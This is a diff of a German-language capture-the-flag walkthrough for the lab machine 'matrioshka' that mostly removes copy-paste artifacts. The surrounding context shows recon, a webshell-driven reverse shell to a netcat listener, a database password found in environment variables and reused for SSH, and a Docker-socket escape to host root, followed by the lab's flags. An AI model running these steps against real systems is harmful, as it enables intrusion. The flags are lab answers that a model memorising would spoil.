@@ -77,12 +77,7 @@ IP-Adresse des Ziels wurde mit `arp-scan` identifiziert.
 ```bash
 arp-scan -l | grep "PCS" | awk '{print $1}'
 # Ausgabe: 192.168.2.180
-
-    
-
-IGNORE_WHEN_COPYING_START
-Use code with caution. Markdown
-IGNORE_WHEN_COPYING_END
+ 
 
 Die IP 192.168.2.180 wurde der /etc/hosts als matrioshka.hmv hinzugefügt.
 Port-Scan (nmap)
@@ -91,13 +86,7 @@ Ein umfassender Nmap-Scan offenbarte offene Ports und Dienste.
 
       
 nmap -sC -sS -sV -T5 -A 192.168.2.180 -p-
-
-    
-
-IGNORE_WHEN_COPYING_START
-Use code with caution. Bash
-IGNORE_WHEN_COPYING_END
-
+ 
     Port 22/tcp: OpenSSH 9.2p1 Debian
 
     Port 80/tcp: Apache httpd 2.4.61 (Debian), Titel "mamushka"
@@ -107,13 +96,7 @@ HTTP Header Analyse (curl)
 
       
 curl -Iv http://matrioshka.hmv
-
-    
-
-IGNORE_WHEN_COPYING_START
-Use code with caution. Bash
-IGNORE_WHEN_COPYING_END
-
+ 
 Die Header zeigten X-Powered-By: PHP/8.2.22 und einen Link-Header zu http://mamushka.hmv/index.php?rest_route=/, was auf WordPress hindeutet. mamushka.hmv wurde ebenfalls zur /etc/hosts hinzugefügt.
 WordPress REST API Enumeration
 
@@ -169,21 +152,15 @@ Mit der Webshell wurde eine Reverse Shell zu unserem Listener aufgebaut:
       
 # Listener auf Angreifer-Maschine
 nc -lvnp 4445
-
-    
  
-
 Wir erhielten eine Shell als www-data.
 Privilege Escalation (Rechteausweitung)
 Benutzer 'matrioshka' - Passwortfund in Umgebungsvariablen
 
 Als www-data wurden die Umgebungsvariablen ausgelesen:
-
-      
+   
 env
-
-     
-
+ 
 Dabei wurde das Datenbankpasswort gefunden: WORDPRESS_DB_PASSWORD=Fukurokuju für den User WORDPRESS_DB_USER=matrioska.
 Dieses Passwort ermöglichte den SSH-Login als Benutzer matrioshka:
 
@@ -240,21 +217,12 @@ Als Root im HFS-Container wurde festgestellt, dass der Docker-Socket gemountet w
 # Im HFS-Container als Root
 docker ps # Zeigt laufende Container auf dem Host
 docker run -v /:/mnt --rm -it ubuntu:20.04 chroot /mnt bash
- 
-
+  
 In der neuen Shell (die Root-Zugriff auf das Host-Dateisystem hat):
-
-      
+  
 cd /root
 cat root.txt
-
-    
-
-IGNORE_WHEN_COPYING_START
-Use code with caution. Bash
-IGNORE_WHEN_COPYING_END
-Erlangte Flags
-
+ 
     User Flag (user.txt): c8129b0390452d8378535cff76e0dde8
 
     Root Flag (root.txt): 7f5d6dbbaff0a1fc6d2a5c9160362908
